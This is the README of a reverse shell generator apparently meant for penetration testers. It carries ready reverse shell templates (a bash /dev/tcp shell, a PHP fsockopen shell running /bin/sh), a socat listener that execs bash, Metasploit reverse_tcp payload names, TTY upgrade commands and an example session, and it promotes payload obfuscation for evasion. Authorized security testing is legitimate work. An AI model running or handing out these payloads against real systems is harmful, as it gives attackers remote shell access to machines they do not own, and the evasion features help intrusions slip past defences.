# Geushell - Your Comprehensive Reverse Shell Generator

## Overview
**Geushell** is an advanced tool designed to simplify the generation of reverse shells for penetration testers and cybersecurity enthusiasts. With its user-friendly interface and robust functionality, Geushell helps users quickly create, customize, and execute reverse shell payloads across various platforms, complete with built-in listeners and TTY upgrade methods.

## Features
- **Diverse Payloads**: Generate reverse shells for popular platforms and languages, including Bash, Python, PHP, Ruby, PowerShell, and more.
- **Metasploit Integration**: Support for common Metasploit payloads to facilitate rapid testing.
- **Customizable Options**: Encode or obfuscate generated payloads for better evasion.
- **Built-in Listeners**: Easily start `nc`, `socat`, or `msfconsole` listeners.
- **TTY Upgrade Methods**: Multiple ways to upgrade shells to TTY for enhanced control.
- **History Management**: Save and load configuration history for repeated use.

## Installation
1. Clone the repository:
   ```bash
   git clone https://github.com/S2K7x/geushell.git
   cd geushell
   ```
2. Install required Python packages:
   ```bash
   pip install -r requirements.txt
   ```
3. Ensure **Geushell** has permission to run:
   ```bash
   chmod +x geushell.py
   ```

## Configuration
Geushell loads its configuration from a `config.json` file, which defines reverse shell templates, Metasploit payloads, TTY upgrade methods, and listener commands. Make sure this file is located in the same directory as the main script.

Example `config.json`:
```json
{
  "reverse_shells": {
    "bash": "bash -i >& /dev/tcp/{}/{} 0>&1",
    "python": "python3 -c 'import socket,subprocess,os; ...'",
    "php": "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
  },
  "metasploit_payloads": {
    "linux_meterpreter": "linux/x64/meterpreter/reverse_tcp",
    "windows_meterpreter": "windows/meterpreter/reverse_tcp"
  },
  "tty_upgrade_methods": [
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "echo os.system('/bin/bash')",
    "script /dev/null -c bash"
  ],
  "listeners": {
    "nc": "nc -lvnp {}",
    "socat": "socat TCP-LISTEN:{},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sane"
  },
  "history_file": "~/.geushell_history.json"
}
```

## Usage
Run Geushell with the following command:
```bash
python3 geushell.py
```

### Basic Workflow
1. **Enter target IP and port**.
2. **Select a reverse shell type**.
3. **Choose to encode or obfuscate** the payload (optional).
4. **Generate the reverse shell**.
5. **Start a listener** for the target connection.
6. **Upgrade the shell to TTY** for better interaction (optional).

### Example Session
```plaintext
[*] Enter target IP: 192.168.1.10
[*] Enter target port: 4444
[*] Available Shells:
[1] bash
[2] python
[3] php
[*] Choose a reverse shell: 2
[+] Generated Reverse Shell:
python3 -c 'import socket,subprocess,os; s=socket.socket(...)
[*] Upgrade to TTY? (y/n): y
[+] Run this TTY upgrade:
python3 -c 'import pty; pty.spawn("/bin/bash")'
[*] Choose listener (nc/socat/msfconsole): nc
[*] Starting listener with:
nc -lvnp 4444
```

## Contributing
Contributions are welcome! Please fork the repository and submit a pull request.

## License
This project is licensed under the MIT License.

## Disclaimer
**Geushell** is intended for legal and ethical use only. Ensure you have proper authorization before using this tool in any penetration testing scenarios.

---
Thank you for using **Geushell**! We hope it becomes a valuable asset in your security toolkit.

